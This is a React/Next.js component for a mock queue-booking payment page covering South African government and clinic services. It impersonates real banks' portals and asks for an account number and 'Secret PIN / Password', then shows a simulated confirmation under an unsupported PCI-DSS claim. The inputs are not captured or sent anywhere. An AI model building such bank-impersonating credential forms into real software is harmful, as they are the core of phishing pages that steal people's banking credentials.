
"use client"

import React, { useState, useEffect, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { ShieldCheck, Loader2, CheckCircle2, Smartphone, Clock, FileText } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

const banks = [
  { name: 'FNB', color: 'bg-[#00A191]', textColor: 'text-white', logo: '/images/fnb.jpeg' },
  { name: 'Standard Bank', color: 'bg-[#0033A1]', textColor: 'text-white', logo: '/images/stbank.jpeg' },
  { name: 'Capitec', color: 'bg-[#E30613]', textColor: 'text-white', logo: '/images/capitec.jpeg' },
  { name: 'Absa', color: 'bg-[#FF0000]', textColor: 'text-white', logo: '/images/absa.jpeg' },
  { name: 'Nedbank', color: 'bg-[#006341]', textColor: 'text-white', logo: '/images/nedbank.png' },
];

function PaymentScreenContent() {
  const [step, setStep] = useState<'selection' | 'details' | 'processing' | 'success'>('selection');
  const [selectedBank, setSelectedBank] = useState<any>(null);
  const [issueTime, setIssueTime] = useState('');
  const router = useRouter();
  const searchParams = useSearchParams();
  const source = searchParams.get('source');
  const branchName = searchParams.get('branch') || 'Home Affairs Bellville';
  const serviceId = searchParams.get('service') || 'id';

  const serviceMeta: Record<string, { name: string; docs: string[] }> = {
    id: { name: 'Smart ID Card', docs: ['Birth Certificate', 'ID Photos', 'Proof of Residence'] },
    passport: { name: 'Passport Services', docs: ['Old Passport', 'ID Document', 'Passport Photos'] },
    birth: { name: 'Birth Certificate', docs: ['Proof of Birth', "Parents' Identity Documents"] },
    'grant-new': { name: 'New Grant Application', docs: ['SA ID', 'Proof of Income', 'Proof of Residence'] },
    'grant-status': { name: 'Grant Status & Appeals', docs: ['Reference Number', 'SA ID'] },
    'card-replace': { name: 'SASSA Card Replacement', docs: ['Affidavit', 'SA ID', 'Old Card (if available)'] },
    outpatient: { name: 'Outpatient Registration', docs: ['Referral Letter', 'Clinic Card', 'SA ID'] },
    pharmacy: { name: 'Pharmacy Collection', docs: ['Prescription', 'Clinic Card'] },
    records: { name: 'Medical Records Request', docs: ['SA ID', 'Consent Form'] },
  };

  const selectedService = serviceMeta[serviceId] || serviceMeta.id;

  useEffect(() => {
    if (source !== 'signup') {
      router.replace('/auth/signup');
      return;
    }
    setIssueTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
  }, [source, router]);

  const handleBankSelect = (bank: any) => {
    setSelectedBank(bank);
    setStep('details');
  };

  const handlePayment = () => {
    setStep('processing');
    setTimeout(() => {
      setStep('success');
    }, 2500);
  };

  if (source !== 'signup') {
    return null;
  }

  return (
    <main className="min-h-screen bg-background flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-lg">
        <AnimatePresence mode="wait">
          {step === 'selection' && (
            <motion.div
              key="selection"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="space-y-6"
            >
              <div className="text-center space-y-2">
                <h1 className="text-3xl font-headline font-extrabold">Secure Queue Booking</h1>
                <p className="text-muted-foreground">Select your bank to receive your <span className="text-primary font-bold">Digital Ticket</span> — R65.00</p>
              </div>

              <div className="grid grid-cols-2 gap-4">
                {banks.map(bank => (
                  <button
                    key={bank.name}
                    onClick={() => handleBankSelect(bank)}
                    className="group relative h-32 rounded-2xl overflow-hidden border border-white/5 bg-card hover:border-primary transition-all hover:scale-105 active:scale-95 shadow-lg"
                  >
                    <div className="relative w-full h-full bg-white">
                      <Image 
                        src={bank.logo} 
                        alt={bank.name} 
                        fill 
                        className="object-cover"
                        sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
                      />
                    </div>
                    <span className="sr-only">{bank.name}</span>
                  </button>
                ))}
              </div>
              
              <div className="pt-4 flex items-center justify-center text-xs text-muted-foreground">
                <ShieldCheck className="h-4 w-4 mr-1" />
                PCI-DSS Compliant Secure Payment Gateway
              </div>
            </motion.div>
          )}

          {step === 'details' && selectedBank && (
            <motion.div
              key="details"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-6"
            >
              <Card className="overflow-hidden border-none shadow-2xl">
                <div className={`p-6 ${selectedBank.color} ${selectedBank.textColor} flex justify-between items-center`}>
                  <h2 className="text-xl font-bold">{selectedBank.name} Portal</h2>
                  <div className="text-sm font-bold opacity-80">R65.00</div>
                </div>
                <div className="p-8 bg-card space-y-6">
                  <div className="space-y-2">
                    <Label>Account / Phone Number</Label>
                    <Input className="h-12 text-lg" placeholder="e.g. 1234567890" />
                  </div>
                  <div className="space-y-2">
                    <Label>Secret PIN / Password</Label>
                    <Input className="h-12 text-lg" type="password" placeholder="••••" />
                  </div>
                  <Button 
                    onClick={handlePayment} 
                    className={`w-full h-14 text-lg font-bold rounded-full ${selectedBank.color} ${selectedBank.textColor} shadow-lg`}
                  >
                    Authorize Payment
                  </Button>
                  <Button variant="ghost" onClick={() => setStep('selection')} className="w-full text-muted-foreground">
                    Cancel and Return
                  </Button>
                </div>
              </Card>
            </motion.div>
          )}

          {step === 'processing' && (
            <motion.div
              key="processing"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="text-center space-y-6"
            >
              <Loader2 className="h-16 w-16 text-primary animate-spin mx-auto" />
              <div className="space-y-2">
                <h2 className="text-2xl font-headline font-bold">Verifying Transaction</h2>
                <p className="text-muted-foreground">We are communicating with {selectedBank?.name}...</p>
              </div>
            </motion.div>
          )}

          {step === 'success' && (
            <motion.div
              key="success"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="text-center space-y-8"
            >
              <div className="relative">
                <CheckCircle2 className="h-24 w-24 text-primary mx-auto" />
                <motion.div 
                  className="absolute inset-0 bg-primary/20 rounded-full blur-2xl"
                  animate={{ scale: [1, 1.2, 1] }}
                  transition={{ duration: 2, repeat: Infinity }}
                />
              </div>

              <div className="space-y-2">
                <h2 className="text-4xl font-headline font-extrabold text-foreground">Payment Confirmed!</h2>
                <p className="text-lg text-muted-foreground">Digital ticket sent to <span className="text-primary font-bold">+27 81 234 5678</span>.</p>
              </div>

              <Card className="p-8 bg-card border-primary/20 space-y-6 max-w-sm mx-auto shadow-2xl relative overflow-hidden text-left">
                <div className="absolute top-4 right-4 text-[10px] font-bold bg-primary text-primary-foreground px-2 py-1 rounded">
                  SECURE DIGITAL
                </div>
                
                <div className="space-y-1">
                  <p className="text-[10px] font-bold uppercase tracking-widest text-primary">Your Position</p>
                  <div className="text-7xl font-headline font-extrabold">B-089</div>
                </div>

                {selectedBank && (
                  <div className="flex justify-center">
                    <Image 
                      src={selectedBank.logo} 
                      alt={selectedBank.name} 
                      width={80} 
                      height={40} 
                      className="object-contain"
                    />
                  </div>
                )}

                <div className="text-sm space-y-4 border-t border-white/5 pt-4">
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-0.5">
                      <p className="text-[10px] font-bold uppercase text-muted-foreground flex items-center">
                        <Clock className="h-3 w-3 mr-1" /> Issued
                      </p>
                      <p className="font-bold">{issueTime}</p>
                    </div>
                    <div className="space-y-0.5">
                      <p className="text-[10px] font-bold uppercase text-muted-foreground flex items-center">
                        <Clock className="h-3 w-3 mr-1" /> Est. Wait
                      </p>
                      <p className="font-bold text-primary">1h 45m</p>
                    </div>
                  </div>

                  <div className="space-y-1">
                    <p className="text-[10px] font-bold uppercase text-muted-foreground">Service Details</p>
                    <p className="text-xs"><strong>Branch:</strong> {branchName}</p>
                    <p className="text-xs"><strong>Type:</strong> {selectedService.name}</p>
                  </div>

                  <div className="space-y-2 bg-muted/30 p-3 rounded-lg border border-white/5">
                    <p className="text-[10px] font-bold uppercase text-muted-foreground flex items-center">
                      <FileText className="h-3 w-3 mr-1" /> Required Documents
                    </p>
                    <ul className="text-[10px] space-y-1 pl-1">
                      {selectedService.docs.map((doc) => (
                        <li key={doc} className="flex items-start">
                          <span className="text-primary mr-1.5">•</span>
                          <span className="text-foreground/80">{doc}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>

                <div className="aspect-square bg-white p-4 rounded-xl mx-auto w-40 flex items-center justify-center mt-4">
                   <div className="grid grid-cols-8 grid-rows-8 gap-0.5 w-full h-full bg-black opacity-10" />
                </div>
              </Card>

              <div className="flex flex-col gap-4">
                <Button 
                  onClick={() => router.push('/queue/ticket-123')}
                  className="h-14 w-full rounded-full bg-primary text-primary-foreground font-bold text-lg shadow-xl shadow-primary/20"
                >
                  Track Live Position
                </Button>
                <Button variant="outline" className="h-12 rounded-full border-white/10" onClick={() => router.push('/')}>
                  Done
                </Button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </main>
  );
}

export default function PaymentScreen() {
  return (
    <Suspense
      fallback={
        <main className="min-h-screen bg-background flex items-center justify-center p-4">
          <div className="flex flex-col items-center space-y-4">
            <Loader2 className="h-12 w-12 text-primary animate-spin" />
            <p className="text-sm text-muted-foreground font-bold">Loading payment gateway...</p>
          </div>
        </main>
      }
    >
      <PaymentScreenContent />
    </Suspense>
  );
}
